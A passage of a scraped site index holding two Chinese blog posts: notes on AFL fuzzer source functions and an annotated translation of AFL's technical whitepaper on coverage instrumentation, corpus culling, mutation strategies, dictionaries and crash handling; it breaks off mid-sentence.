user（ctrl-c） ","date":"2022-01-09","objectID":"/2022/01/afl-rsc/:1:4","tags":null,"title":"AFL 源码分析（一）从 0 到 1 再到 n","uri":"/2022/01/afl-rsc/"},{"categories":["General"],"content":"Exit 在这一部分 AFL 会保存测试结果，并圆润地关闭自己 向还没关掉的子进程以及 forkserver 进程发送 kill 信号，并等待它们圆润地关闭 write_bitmap 保存 bitmap 到硬盘，通常是为了 -B 选项进一步 fuzz write_stats_file save_auto destroy_queue, destroy_extras 销毁内存 exit(0) ","date":"2022-01-09","objectID":"/2022/01/afl-rsc/:1:5","tags":null,"title":"AFL 源码分析（一）从 0 到 1 再到 n","uri":"/2022/01/afl-rsc/"},{"categories":["General"],"content":"第 1 次执行 紧接上文，AFL 调用 perform_dry_run 开启对队列的第一轮遍历，如果有错误或者不合适的测试用例及时报错。结束后使用 cull_queue 修剪测试队列。 ","date":"2022-01-09","objectID":"/2022/01/afl-rsc/:2:0","tags":null,"title":"AFL 源码分析（一）从 0 到 1 再到 n","uri":"/2022/01/afl-rsc/"},{"categories":["General"],"content":"perform_dry_run() 遍历队列，对其中每个元素进行如下操作 打开文件，读出内容 将其传入 calibrate_case，得到返回值 res 根据返回值判断错误 FAULT_NONE 队列没有元素错误。check_map_coverage 后结束。 FAULT_TMOUT 当前元素超时错误。判断 timeout_given 设置，为 2 则跳过该元素。 FAULT_CRASH 初始元素就引发了崩溃。需要排除 Out Of Memory（mem_limit 太小） 与 MacOS （非标准平台下的 fork 系统调用）问题。如果确实需要从崩溃元素开始变异，应该开启 crash mode. FAULT_ERROR 目标程序无法执行 FAULT_NOINST 没检测到插桩代码 FAULT_NOBITS 无用测试用例。如果 in_bitmap 没有初始化，且不让打乱顺序（ shuffle_queue 指示），则报警。 ","date":"2022-01-09","objectID":"/2022/01/afl-rsc/:2:1","tags":null,"title":"AFL 源码分析（一）从 0 到 1 再到 n","uri":"/2022/01/afl-rsc/"},{"categories":["General"],"content":"calibrate_case() 该函数在 perform_dry_run, save_if_interesting, fuzz_one 中均会调用。每个测试轮都会对测试用例遍历，而对每个测试用例都会进行多轮校验。 init_forkserver 确保开启 forkserver ，获取当前时间。 将初始 trace_bits 保存到 first_trace ，has_new_bits* 检查 trace_bits 是否改变（相比于 virgin_bits ），new_bits 存放返回值。设定校准轮数 stage_max . 每一轮校准如下： write_to_testcase 将新的内容写入测试用例 run_target 做一次 fuzz，这次执行中的路径记录会保存在 trace_bits 。 如果 count_bytes(trace_bits) 返回 0，则返回 FAULT_NONE 错误 用 trace_bits 计算 cksum ，如果改变则调用 has_new_bits 更新 new_bits . 并且在非 dry run 时，如果 trace_bits 发生了改变则调大校准轮数。 这个测试用例的校准结束，收集信息。调用 update_bitmap_score* 更新此队列优胜者。 如果这是第一轮，该测试用例经过校验以后 new_bits 还是 0，则返回 FAULT_NOBITS 错误。 如果 new_bits 为 2，代表有新的路径产生. ","date":"2022-01-09","objectID":"/2022/01/afl-rsc/:2:2","tags":null,"title":"AFL 源码分析（一）从 0 到 1 再到 n","uri":"/2022/01/afl-rsc/"},{"categories":["General"],"content":"第 n 次执行 AFL 区分第 1 轮与第 n 轮是为了 Fall-Fast, 但不管是哪一轮，其总体逻辑均相同。Dry run 结束后，每一轮对每一个测试用例均调用 fuzz_one 进行测试，然后 cull_queue 修剪队列。 ","date":"2022-01-09","objectID":"/2022/01/afl-rsc/:3:0","tags":null,"title":"AFL 源码分析（一）从 0 到 1 再到 n","uri":"/2022/01/afl-rsc/"},{"categories":["General"],"content":"fuzz_one() 以队列中的元素为参数，获取该测试用例内容，喂给目标程序。 根据队列优胜者机制，按特定概率跳过此元素。跳过则直接返回。 如果上一轮 calibrate_case 产生校对错误，获取得到的 cal_failed 计数，小于 CAL_CHANCES 时重新调用 calibrate_case，防止产生非法 trace_bits. 调用 trim_case 对当前元素进行剪枝，即使失败也只剪一次。 调用 calculate_score 对当前元素打分，用于 havoc_stage 开始变异（每经过一个阶段都会调用 common_fuzz_stuff ） simple bitflip（+ dictionary construction） arithmetic inc/dec interesting values dictionary stuff random havoc splicing ","date":"2022-01-09","objectID":"/2022/01/afl-rsc/:3:1","tags":null,"title":"AFL 源码分析（一）从 0 到 1 再到 n","uri":"/2022/01/afl-rsc/"},{"categories":["General"],"content":"common_fuzz_stuff() 将变异得到的测试用例写进硬盘，执行目标程序并将其喂给它，收集结果并处理错误。 write_to_testcase run_target 执行 save_if_interesting ","date":"2022-01-09","objectID":"/2022/01/afl-rsc/:3:2","tags":null,"title":"AFL 源码分析（一）从 0 到 1 再到 n","uri":"/2022/01/afl-rsc/"},{"categories":["General"],"content":"trim_case() 减少测试用例大小，细节略。 ","date":"2022-01-09","objectID":"/2022/01/afl-rsc/:3:3","tags":null,"title":"AFL 源码分析（一）从 0 到 1 再到 n","uri":"/2022/01/afl-rsc/"},{"categories":["General"],"content":"calculate_score() Calculate case desirability score to adjust the length of havoc fuzzing. A helper function for fuzz_one(). Maybe some of these constants should go into config.h. 该函数打分是为了变异的 havoc 过程。给执行时间短，代码覆盖高，新发现的，路径深度深的测试用例拥有更多 havoc 变异的机会。细节略。 ","date":"2022-01-09","objectID":"/2022/01/afl-rsc/:3:4","tags":null,"title":"AFL 源码分析（一）从 0 到 1 再到 n","uri":"/2022/01/afl-rsc/"},{"categories":["General"],"content":"save_if_interesting() Check if the result of an execve() during routine fuzzing is interesting, save or queue the input test case for further analysis if so. Returns 1 if entry is saved, 0 otherwise. has_new_bits(virgin_bits) 返回值为 0 时直接返回，否则将测试用例放入测试队列文件夹并如下命名（describe_op 会分析该测试用例是如何变异得到的）： fn = alloc_printf(\"%s/queue/id:%06u,%s\", out_dir, queued_paths,describe_op(hnb)) 然后 add_to_queue 为此测试用例开辟空间并放入队列中。重新计算队列 checksum 后将测试用例内容写入并调用 calibrate_case 校验错误码。在校验的过程中记录 crashes 与 hangs 文件夹。 ","date":"2022-01-09","objectID":"/2022/01/afl-rsc/:3:5","tags":null,"title":"AFL 源码分析（一）从 0 到 1 再到 n","uri":"/2022/01/afl-rsc/"},{"categories":["General"],"content":"原文地址 https://lcamtuf.coredump.cx/afl/technical_details.txt =================================本文格式如下==================================== 笔记 Question\r\r问题\r\r 原文 水平有限，难以翻译  专有名词 or 有必要保留原词  ==================================这是分割线===================================== ","date":"2022-01-01","objectID":"/2022/01/afl-white-book/:0:0","tags":null,"title":"AFL 白皮书翻译与读书笔记","uri":"/2022/01/afl-white-book/"},{"categories":["General"],"content":"0 设计陈述 Design statement AFL 既不关注于单一方面的操作规则，也不是某一特定理论的 PoC 。此工具可以被认为是一个被实践证实有效的 hack 行为集合，把这些行为以最简单、最健壮的形式实现便得到了 AFL. 轻量级的插桩技术instrumentation 使 AFL 的许多特性成为可能，并作为其基础，但是这个技术只应该被认为是一种达到目的的手段，这里最核心的原则应该是速度 speed，可靠性 reliability 与易用性 ease of use. ","date":"2022-01-01","objectID":"/2022/01/afl-white-book/:1:0","tags":null,"title":"AFL 白皮书翻译与读书笔记","uri":"/2022/01/afl-white-book/"},{"categories":["General"],"content":"1 覆盖度测量 Coverage measurements 注入编译后程序的插桩代码会捕捉分支（边）覆盖率 branch (edge) civerage 与粗略的分支命中次数branch-taken hit counts . 本质上来说，插桩代码如下 cur_location = \u003cCOMPILE_TIME_RANDOM\u003e; shared_mem[cur_location ^ prev_location]++; prev_location = cur_location \u003e\u003e 1; cur_location 取随机值以简化连接复杂项目的过程，并且保持异或输出均匀分布 shared_mem[] 是一个 64 kB 大小的共享内存区域SHM ，被调用者 caller 传给被插桩的程序。其每个字节可以认为是对于元组 (branch_src, branch_dst) 的一次命中 hit . 此数组大小选择为 64 kB 是为了减少碰撞的发生。通常的目标大概有在 2k 到 10k 的可发现分支点，碰撞概率如下 Branch cnt Colliding tuples Example targets 1,000 0.75% giflib, lzo 2,000 1.5% zlib, tar, xz 5,000 3.5% libpng, libwebp 10,000 7% libxml 20,000 14% sqlite 50,000 30% - 同时，这个大小也足够小，以微秒级分析的同时也能轻易地塞进 L2 缓存。 这种覆盖率的计算型是可以比简单的块覆盖 block coverage 提供更多程序执行路径的信息。并且，它能轻易区分如下执行路径： #1: A -\u003e B -\u003e C -\u003e D -\u003e E (tuples: AB, BC, CD, DE) #2: A -\u003e B -\u003e D -\u003e C -\u003e E (tuples: AB, BD, DC, CE) 由上下文可以认为大写字母代表程序基本块之间的边，每一条边都有一个随机化的ID（即cur_location），值分别为A-E，所以 B-\u003eC-\u003eD 路径表现为 shared_mem[(B\u003e\u003e1)^C]++ shared_mem[(C\u003e\u003e1)^D]++ B-\u003eD-\u003eC 路径表现为 shared_mem[(B\u003e\u003e1)^D]++ shared_mem[(D\u003e\u003e1)^C]++ 显然是可以区分的。但是块覆盖只会记录 B,C,D 块均命中，却无法区分。 Difference between block coverage and branch coverage 这有助于发现代码潜在的微小缺陷，因为安全漏洞更多地出现在非预期或者错误的状态转变，仅仅追求达到更多新的基本块是不够的。 代码最后一行的移位操作是为了保证元组的方向性（否则，A^B 与 B^A 是无法区分的），并且可以区分不同的紧环 tight loops （否则, A ^ A 与 B ^ B 也无法区分）. 如果不移位，对于路径 A-\u003eB 与 B-\u003eA 表现均为 shared_mem[A^B]++ ，无法区分 如果不移位，对于环形路径 A-\u003eA 与 B-\u003eB 表现均为 shared_mem[0]++ ，无法区分 Intel CPU 上没有饱和算数指令 saturating arithmetic opcodes 导致命中计数器有时可能会归零 wrap around to zero . 但这是一个相当稀有且局部的事件，可以看作是一个 trade-off. 通俗来讲，饱和算数指令就是具有上下界的算数指令，比如一个规定算数范围为-100~100的饱和算数指令中，(40+80)-(50+60)=100-100=0（而不是10） Intel 没有使用饱和算数指令，而使用modular arithmetic. 导致最大值的溢出会向最小值保留，比如最常见的正溢出与负溢出 Wikipedia 认为饱和算数指令更接近真实值，并如下举例： for 8-bit binary signed arithmetic, when the correct answer is 130, it is considerably less surprising to get an answer of 127 from saturating arithmetic than to get an answer of −126 from modular arithmetic. Likewise, for 8-bit binary unsigned arithmetic, when the correct answer is 258, it is less surprising to get an answer of 255 from saturating arithmetic than to get an answer of 2 from modular arithmetic. ","date":"2022-01-01","objectID":"/2022/01/afl-white-book/:2:0","tags":null,"title":"AFL 白皮书翻译与读书笔记","uri":"/2022/01/afl-white-book/"},{"categories":["General"],"content":"2 新路径检测 Detecting new behaviors AFL 全程维护这个全局的元组 map shared_mem[]. 这些数据能在各自的路径中被快速对比，并可以在一个简单的循环里用几个 dword- 或者 qword- 宽度的指令进行更新。 当变异后 mutated  的输入产生了包含新元组的执行路径时，对应的输入就会被保存，并指导接下来的过程（见 Section #3）. 没有触发新的局部状态转变的输入（换句话说，没有产生新的元组）将被丢弃，即使它们产生了新的全局控制流。 这样的解决方案允许非常细粒度fine-grained 的对程序状态长期探索，并且可以不被复杂计算与不可靠的全局比较所困扰，同时也能防止搜寻过程中的路径爆炸 path explosion . 为了进一步陈述这个性质，考虑下面的路径。这两个路径是不同的，因为新元组 CA, AE 的出现 #1: A -\u003e B -\u003e C -\u003e D -\u003e E #2: A -\u003e B -\u003e C -\u003e A -\u003e E 同时 #2 产生后，#3 就不再认为是有意义的了，尽管它产生的全局路径几乎完全不同 #3: A -\u003e B -\u003e C -\u003e A -\u003e B -\u003e C -\u003e A -\u003e B -\u003e C -\u003e D -\u003e E AFL 在检测新元组出现的同时，也粗略地考虑了元组命中次数，它们被分为了如下几个桶 bucket ： 1, 2, 3, 4-7, 8-15, 16-31, 32-127, 128+ To some extent, the number of buckets is an implementation artifact.  它是一个从 8-bit 计数器到 8-position 位图的映射，前者由插桩产生，后者由 AFL 运行时跟踪已出现的元组数来计数。 元组数在每个桶内的变化是可以忽略的；从一个桶到另一个桶的改变将会被认为是程序控制流中的一次有趣的改变，也会指导下一阶段的进化过程 evolutionary process . 之所以以这种方式去关心各个元组命中数，是因为它能发现一些潜在的有趣的控制流改变，比如某块代码以往通常只命中一次，但这次却被执行了两次。同时，它显著地降低了对一些经验上不会被注意的改变的敏感度，比如循环的第48次。并且，它在某种程度上也增强了高密度路径图中元组碰撞的抵抗力 tuple collisions in dense trace maps. 循环执行某条边 47 次以后，再循环一次也不应该被认为是有趣的。桶式分类可以让绝大部分循环次数能落在同一个桶，减少对循环的敏感度。同时，偶然的元组碰撞产生的影响也会被忽略。 执行过程由时间与空间限制来严格管制；默认情况下，超时 timeout 被设置为初始化标准执行速度对应时间的 5 倍，大概 20 ms. 这样看似激进的超时设置可以阻止 fuzzer 表现产生巨大衰减至 tarpit ，也就是说，增加 1% 的覆盖率然而 fuzzer 却慢了 100 倍；我们十分务实地拒绝了这种情况的发生，并希望 fuzzer 可以找到一个更轻松的方式来遍历相同数量的代码。经验性的测试明确告诉我们，宽松的时间限制并不值得！ ","date":"2022-01-01","objectID":"/2022/01/afl-white-book/:3:0","tags":null,"title":"AFL 白皮书翻译与读书笔记","uri":"/2022/01/afl-white-book/"},{"categories":["General"],"content":"3 输入队列变异 Evolving the input queue 正如 Section #2 中提到的，变异后产生新的状态转移的测试用例将被添加到输入队列 input queue ，并作为新一轮 fuzzing 的起点。它们会增补而并非替代已有的发现。 和其他更贪心的遗传算法 genetic algorithms 相比，这样做可以让 AFL 循序渐进地探索各种各样的程序断联处与自身潜在的数据格式不匹配之处，正如此图所见 Question\r\r对 gzip 6轮 fuzzing 产生的测试用例图，意义不明\r\r 还有一些对于此算法实践的结果讨论：讨论1，讨论2 讨论1中，作者记录了只喂给 AFL 一个 ‘hello’，AFL 如何在 fuzzing djpeg 的过程中慢慢变异出了合法的 JPEG 格式的测试用例的过程。正如文中形容的，传统 fuzzer 不停地随机扭曲、拼接数十个 bit 而恰好拼对的概率是 astronomically 低的，肯定了 AFL 的先进性。同时也能看到 AFL 的局限，但认为在很远的将来才会产生完全另一层次的更高级 fuzzer. 并发现大对于搜索空间的判断， AFL 绕过的效率很低： if (strcmp(header.magic_password, \"h4ck3d by p1gZ\")) goto terminate_now; Question\r\r/out_dir/queue/… 中存放所有的测试用例，命名方式暂时不清楚\r\r 讨论2中，作者低调地将 AFL fuzzing 过程归纳为「随机地变异输入文件，缓慢地向新发现推进」，并对 AFL 的表现表示惊讶，他本人也不想从静态分析和符号执行的角度去理解喂给程序的数据到底做了什么。 接讨论1，由于字符串匹配搜索空间大，所以对于人类易阅读的语言 HTML 与 JavaScript, AFL 效率反而很低。而在这篇讨论中，作者发现 AFL fuzzing XML 语法的过程中，从最初的 \u003ca b=“c”\u003ed\u003c/a\u003e 变异到了合法的 CDATA 结构，他认为原因有二：-O3 编译选项将字符串常量比较直接优化为内联，以及 libxml2 使用宏来进行字符串比较会产生大量相同结构的代码易于插桩。并认为这个结果是非预期并且不稳定的（spooky），得出的结论是：让 AFL 去 fuzz 这些 highly verbose text-based syntax 的程序是在浪费时间 在这个过程中合成出来的语料库就是一个个“哇噢，它出乎了我的意料”的输入集合，它们也会顺其自然地作为任何其他测试过程的种子（比如，手动对资源密集型 resource-intensive 的桌面应用做压力测试 stress-test ） 这样做的话，对于大多数目标的队列会扩充到大概 1k 到 10k 个条目；其中大概 10-30% 是因为发现了新的元组，剩下的与命中次数桶的改变相关。 下面这张表对比了在不同指导 fuzzing 的方法下发现文件语义、探索程序状态的能力。这里的目标程序是 GNU patch 2.7.2 ，编译选项 -O3， 种子是一个空的文本文件；the session consisted of a single pass over the input queue with afl-fuzz: Fuzzer guidance strategy used Blocks reached Edges reached Edge hit cnt var Highest-coverage test case generated (Initial file) 156 163 1.00 (none) Blind fuzzing S 182 205 2.23 First 2 B of RCS diff Blind fuzzing L 228 265 2.23 First 4 B of -c mode diff Block coverage 855 1,130 1.57 Almost-valid RCS diff Edge coverage 1,452 2,070 2.18 One-chunk -c mode diff AFL model 1,765 2,597 4,99 Four-chunk -c mode diff 该表测试程序为 patch，使用不同模式 (RCS, -c) 的 diff 可以产生最高覆盖度的测试用例，比对了这几种指导 fuzzing 变异的方式的最佳表现 第一个条目是 blind fuzzing (“S”)，代表只盲变异 blind fuzzing 一轮；第二行 (“L”) 代表 fuzzer 会在循环中盲变异多轮，直到运行了和插桩运行 instrumented runs 差不多的执行周期 execution cycles  的整个过程的表现. 当然，插桩运行时队列生长的速度会慢很多。 Blind fuzzing 为盲变异，有 S 与 Ｌ 两种方式，均相当于对照组 execution cycles 就是字面意思，即计算机体系结构中取指、译码、执行中的执行周期。 instrumented runs 可以翻译成插桩运行，也可以认为是有指导、有反馈地运行，指代的就是后续 Block, Edge coverage, AFL model 这些有指导的、不盲的 fuzzing. 保持 Blind fuzzing 与后续 instrumented runs 的循环执行周期数大致相近，才有比较的意义。 插桩运行时队列生长的速度慢，因为需要反复分析；盲 fuzzing 弄出一个测试用例队列是最快的，但能不能有效就不一定了。 另一个独立的实验获得了大致相同的效果，在这里让 fuzzer 在编译时去掉所有的随机 fuzzing 阶段，只保留一系列基础的序列操作，比如游走位翻转 walking bit flips . 原文为 the fuzzer was modified to compile out all the random fuzzing stages, 有文章将其翻译为「修改成所有都是 random fuzzing」，我认为「compile out」应该是指「编译去除掉」而不是「编译出」，并在这里找到了类似的语境。 作者在这里解释了 walking bit flips, 它是一种从头到尾按位依次翻转的一种变异方法。 因为这样做会让 fuzzer 没办法去改变输入文件的大小，所以这里我们给了它一个合法的、统一的 diff 输出作为种子。结果如下： Queue extension strategy used Blocks reached Edges reached Edge hit cnt var Number of unique crashes found (initial file) 624 717 1.00 - Blind fuzzing 1,101 1,409 1.60 0 Block coverage 1,255 1,649 1.48 0 Edge coverage 1,259 1,734 1.72 0 AFL model 1,452 2,040 3.16 1 上文提到过，有一些基于遗传算法的 fuzzing，它们维护单个测试用例并试图将其进化到其能达到的最大覆盖率。但至少从上面的测试结果来看，这些”贪婪“的解决方法并没有比盲 fuzzing 策略有明显的好处。 ","date":"2022-01-01","objectID":"/2022/01/afl-white-book/:4:0","tags":null,"title":"AFL 白皮书翻译与读书笔记","uri":"/2022/01/afl-white-book/"},{"categories":["General"],"content":"4 语料库精简 culling the corpus 上述提到的渐进式状态探索方式也会不可避免地导致：一些后续合成的测试用例产生的边覆盖情况反而是它们祖先的边覆盖情况的真子集 strict superset . 为了优化 fuzzing 结果，AFL 会定期用一个快速算法重新评价队列元素，让剩下的测试用例变得特别有效。这个算法做了这样一件事：去选择一个更小的测试用例子集，并保证仍然覆盖同样的元组数。 它是这样做的：给队列中每个元素按照执行延迟 execution latency 与文件大小按比例打分；以此来选择每个元组的低分参与元素。 然后这些元组便可以用如下一套简单的工作流来完成处理： 寻找下一个没有出现在当前工作集中的元组 定位对于这个元组的最高分的队列元素 将此元素产生的路径上出现的所有元组加入当前工作集 回到第 1 步，直到所有元组都出现在当前工作集中 队列元素即为一个个测试用例，测试用例产生元组，要在达到相同数量的元组下精简测试用例 两个条件相互制约的优化算法，很容易联想到机器学习中的EM算法，可谓异曲同工。 由上述”更受欢迎的“的元素组成的语料库通常比一开始的集合小 5-10 倍。“不受欢迎的\"元素也没有被丢弃，但它们在队列中将以特定概率被跳过： 如果队列里还有新的、尚未喂给程序的”受欢迎的“元素，那么”不受欢迎的“元素会以 99% 的概率跳过。 如果没有新的”受欢迎的“元素： 如果当前”不受欢迎的“元素以前已经被喂给程序过，它将以 95% 的概率跳过。 如果它没有经历过任何一轮 fuzzing，跳过的概率将下调到 75%. 基于实际测试，我们认为上述策略很好地平衡了队列循环速度 queue cycling speed 与测试用例密度 test case diversity . 对于更加成熟但慢得多的精简算法，我们可以使用 afl-cmin 来在输入或者输出语料库上应用。这个工具永久地丢弃了多余的元素，产生了更小的适合于 afl-fuzz 以及其他外部工具的语料库。 ","date":"2022-01-01","objectID":"/2022/01/afl-white-book/:5:0","tags":null,"title":"AFL 白皮书翻译与读书笔记","uri":"/2022/01/afl-white-book/"},{"categories":["General"],"content":"5 输入文件减枝 Trimming input files 输入文件大小对于 fuzzing 表现有很大的影响，不仅因为大文件会导致目标程序执行缓慢，大文件也会减少变异重要部分的可能，比如控制格式与结构，而增加变异无用数据块的可能。在 perf_tips.txt 中详细讨论了这一点。 先不说用户可能提供一个低质量语料集作为开始，一些变异方式本身也有在迭代过程中增加文件大小的趋势，所以减少文件大小是很重要的。 幸运的是，插桩反馈提供了一种自动对输入文件减枝的同时保证执行路径不受影响的简单方法。 afl-fuzz 内置的减枝器使用变化的长度和单步步长 variable length and stepover 来顺序地尝试删去数据块；任何不会影响路径图校验和 checksum of the trace map 的删除就会被 commit 回硬盘。这个减枝器并没有设计地非常准确详尽；相反，它试图找到一个「准确性」与「在选择合适块大小与单步步长时进程花费的 execve 调用数」的折中点。最后的结果是，平均每个文件需要多花费 5-20% 的 execve 调用数。 Question\r\r看上去减枝过程中的两个参数是 length 与 stepover. stepover 代表 扫描的步长？length 代表数据块大小？两者在顺序扫描的时候有什么区别？ \r\r 这里 commit 借用了 git 相关概念，是歪果仁比较常说的话，代表这个变化是被承认的，是应该生效的。易领会意思，但因为文化差异很难确切翻译。 而另一独立工具 afl-tmin 使用一个更详尽的迭代算法，也尝试在减枝后的文件上使用字符标准化 alphabet normalization . 具体来说，afl-tmin 操作如下： 首先，此工具会自动选择操作模式。如果初始输入就会引起目标程序崩溃，afl-tmin 会运行非插桩模式non-instrumented mode , 不断尝试去调整输入让它变得更简单的同时仍然可以导致目标程序崩溃。第二种情况，如果目标程序没有崩溃，afl-tmin 会运行插桩模式instrumented mode , 调整减小输入的同时不改变执行路径。 这个最小化的算法实际上是这样的： 尝试用大步长去清零大的数据块。从经验上看，这将会为后续更细粒度的工作铺路，从而降低 execve 调用。 尝试进行一轮块删减，在这个过程中减少块大小，单步长度以及二分查找样式binary-search-style . 数出不同的字母数并尝试批量替换成零，以实现字符标准化 最后，对剩下的非零字节进行逐字节的标准化 Question\r\rbinary-search-style ?? alphabet normalization 是指 unicode-normalization ？\r\r afl-tmin 使用 ASCII 码数字 0 来清零，而不是 \\x00 . 这样做的原因是我们认为这样修改会更不易干扰到程序解析输入的过程，以更快达到成功的最小化结果。 这个算法比学术界上提出的一些测试用例精简方法的设想所涉及到的东西要少，但它需要的 execve 调用同样要少很多，并且在真实世界应用时能产生与其相媲美的结果。 Section #4 强调的是如何最小化输入队列，Section #5 则是如何最小化输入队列中的每个元素 ","date":"2022-01-01","objectID":"/2022/01/afl-white-book/:6:0","tags":null,"title":"AFL 白皮书翻译与读书笔记","uri":"/2022/01/afl-white-book/"},{"categories":["General"],"content":"6 模糊测试策略 Fuzzing strategies 插桩带来的反馈也使我们评估不同 fuzzing 策略以及优化它们的参数变得容易，最终使其在各种不同的输入文件类型上都能奏效。afl-fuzz 使用的策略是格式不可知论format-agnostic , 并在此文中详细描述。 “设计 fuzzer 的变异引擎其实更像一门艺术而非科学。AFL 变异新输入是渐进的，即先应用一些简单的变异比如顺序位翻转和简单的算术变换等，再进行更复杂的变换。这样做是想让变异结果尽量的先变得简单与优雅。 AFL fuzzing 策略有效性的衡量对于各种各样真实世界的程序是基本一致的，从 JPEG, PNG, GIF, WebP 到 gzip, xz, tar 等格式都是如此。这样使得不同 fuzzing 策略更好比较效果： Walking bit flips* 顺序翻转位，步长恒定为 1 bit，每行翻转的位数范围为 1 到 4. 执行开销太大（一字节八次 execve），所以 AFL 在 3 轮之后就会进行策略2 Walking byte flips* 顺序翻转字节，步长恒定为 1 byte，执行开销较小（一字节一次 execve），虽然有局限性但是效果不差 Simple arithmetics* 步长恒定为 1 byte，做 -35 到 +35 的算术加法。实现细节分为三个阶段，不再展开。执行开销相当大（大约一字节 20 次执行）但如果将算术限制在 -16 到 +16 之间，开销会急剧下降，路径覆盖率也只会产生微小影响。 Known integers* 步长恒定为 1 byte，硬编码一个整数集合，顺序地用它去覆盖输入。大约一字节 30 次执行. Stacked tweaks 在死循环中随机执行一系列操作。这一阶段效果通常比上述都好。 Test case splicing 最后，随机交换两个不同的测试用例的一部分。 （注：* - deterministic strategy，并且从上到下即为 AFL 策略的应用顺序）” 值得注意的是，afl-fuzz 大部分工作实际上具有高度的确定性，stacked tweaks 与 test case splicing 在很后面的阶段才被应用。确定性的策略包括： 顺序位翻转，步长与翻转长度可变 顺序小整数加减 顺序特殊整数（如 0, 1, INT_MAX 等） 插入 一开始使用这些确定性策略是为了产生紧凑的测试用例，并且使得到的引起崩溃的测试用例和不崩溃的测试用例区别尽量小。 在确定性策略应用结束后，会应用堆叠的位翻转、插入、删除、算术运算与拼接等非确定性操作。 所有策略的效果与 execve 开销都在上述博客中阐明。 在 historical_notes.txt 中描述了关于首要性chiefly ，表现performance ，复杂度simplicity ，可靠性reliability 的原因，AFL 也通常不会去考虑特定变异对程序状态改变的具体影响；这些 fuzzing 步骤只是名义上的盲（随机），它们会也只会受输入队列指导。 即便如此，这套规则也有一个（不太重要的）例外：当一个新进入输入队列的元素经过部分确定性的步骤后发现对执行路径的校验和没有产生任何影响，它们可能会被跳过剩下的确定性步骤而直接进入到后续的随机性步骤。特别是对于冗长的、人类易读的数据结构，这样做可以在基本不影响覆盖率的情况下减少 10-40% 的 execve 开销。对于极端的例子，比如通常是块对齐的 tar 文件，这样做可以减少高达 90% 开销. Because the underlying “effector maps” are local every queue entry and remain in force only during deterministic stages that do not alter the size or the general layout of the underlying file, this mechanism appears to work very reliably and proved to be simple to implement. Section #3 将 AFL model 与其他变异策略进行大致对比，Section #6 探讨了 AFL model 的细节，并对 model 内各个变异策略进行阐述与对比。 ","date":"2022-01-01","objectID":"/2022/01/afl-white-book/:7:0","tags":null,"title":"AFL 白皮书翻译与读书笔记","uri":"/2022/01/afl-white-book/"},{"categories":["General"],"content":"7 字典构建 Dictionaries 插桩反馈同样使得自动检测输入文件的语法 token 变得容易，进而更易检测某些被测试的 parser 并得出合法组合，通过一些提前定义的或是自动检测出的字典项。 这里讨论了 afl-fuzz 是如何实现语法检测的 “AFL 变异引擎一个最大的局限性就是 syntax-blind，对于这种目标广泛的 fuzzer ，处理类似于 SQL 与 HTTP 等冗长文法目标都很困难。但也有解决方法，并且效果惊奇。 其实这也是一种折中，毕竟每次构建一个一次性的、针对特定协议的变异引擎并不简单。我们认为，提前在 spec 中保留一系列的基础文法 token 看上去毫无意义，实际上插桩指导的 fuzzing 会区分出有意义与没意义的测试用例，进而去生成合文法的输入。这个想法很简单，但在实现之后我们发现赌对了：对 sqlite 的 fuzzing 过程中，提前为 fuzzer 准备一些从官方文档中提取出的关键词之后，它就能快速产生不寻常并且符合文法的测试用例。 提取关键词比定义文法规约要简单得多，但工作量也不小。为了帮助那些没时间，也不情愿去构造合适字典的人，我们应用了一个算法原则去发现关键词：识别那些改变后比改变周围位置造成完全不同执行路径的位置。当发现这种情况时，很大程度上说明改变这些位置的改变导致了文法原子判断语句的错误，这时我们将整块代码加入字典，以待后续进一步变异。 但这样也有局限性，比如它只能知道初始输入内的或是一些很容易变异得到的 token . 并且对于一些树形解析器等不包含文法原子判断的应用，这个算法并没有做到任何事情（虽然 fuzzer 最终会解决这个问题，但是会比较慢）。” 本质上说，当一些经典的、基础的、易获得的语法 token 完全随机结合时，插桩代码与队列的变异设计在插桩模式下会一起提供反馈去区分没意义的与能导致新表现的变异——并且在这基础上去构建更复杂的语义。 这些字典已经被证实可以让 fuzzer 迅速重构高度冗长、复杂的语言文法，比如 JavaScript, SQL, XML；前面这篇文章中列举出了一些产生出的 SQL 表达式的例子。 有趣的是，AFL 同样会自动隔离已经出现在输入文件中的 token . 它在通过在翻转比特时定位对程序执行路径产生一致性改变的位置来实现；这是一个出现潜在的原子比较语句的暗示。fuzzer 依靠这个暗示去压缩这部分产生的“自动构建的字典”，后续再与其他 fuzzing 策略结合。 原子比较语句指的就是一些在程序中写死的字符串等数值的比较语句，比如前文提到的： if (strcmp(header.magic_password, \"h4ck3d by p1gZ\")) goto terminate_now; ","date":"2022-01-01","objectID":"/2022/01/afl-white-book/:8:0","tags":null,"title":"AFL 白皮书翻译与读书笔记","uri":"/2022/01/afl-white-book/"},{"categories":["General"],"content":"8 崩溃去重 De-duping crashes 崩溃去重也是一个有竞争力的 fuzzer 该处理的问题。许多直白的解决方法都会陷入问题；特别是仅仅查看出错地址，在常用的库函数上（比如 strcmp, strcpy）很可能会导致完全不相关的错误被归为一类；而如果崩溃可以在几步不同的、可能导致递归的代码路径上达到，回溯调用栈去计算校验和这种不直白的方法也将导致严重的崩溃数量膨胀。 afl-fuzz 实现的方法是，只有在以下两种情况之一发生时才认为产生了一个不同的崩溃： 此次崩溃路径上包括了从未出现在之前崩溃路径上的元组 此次崩溃路径上缺少了在之前崩溃路径上的元组 这种方法在 fuzzing 过程的早期会易受路径数量膨胀的影响，但它会慢慢展示出非常强的自我限制self-limiting 能力。这种去重方式与执行路径分析的逻辑一起构成了 afl-fuzz 的基石。 将元组作为记录单元能有效避免组合爆炸，尽管初始路径探索时会有大量新的元组产生，但是后续产生的路径再多，却很有可能都是相同元组的不同组合，这就是 self-limiting 的含义. ","date":"2022-01-01","objectID":"/2022/01/afl-white-book/:9:0","tags":null,"title":"AFL 白皮书翻译与读书笔记","uri":"/2022/01/afl-white-book/"},{"categories":["General"],"content":"9 崩溃调查 Investigating crashes 很多类型的崩溃的可利用性exploitability 是难以界定的；afl-fuzz 会尝试使用崩溃调查模式crash exploration mode 来解决这一问题：规则与正常操作模式类似，但变异过后不崩溃的测试用例会被直接丢弃。 这种解决方法的价值在这篇文章中详细探讨。 “对于任何一个 fuzzing 的项目来说，确定崩溃存在怎样的风险都需要大量的努力。一小部分情况下十分清晰，比如程序尝试去写或者跳到一些在输入文件中出现的地址。但大部分崩溃的原因十分模糊，比如 NULL pointer dereferences 或者 从奇奇怪怪的地方错误读，它们也许包含了潜在的漏洞，也许只是一些无害的 bug . 我们做出了一个名为 crash exploration mode 的模式，用 -C 开启。用户只需要拿着一个崩溃的测试用例丢给 AFL ，并 -C 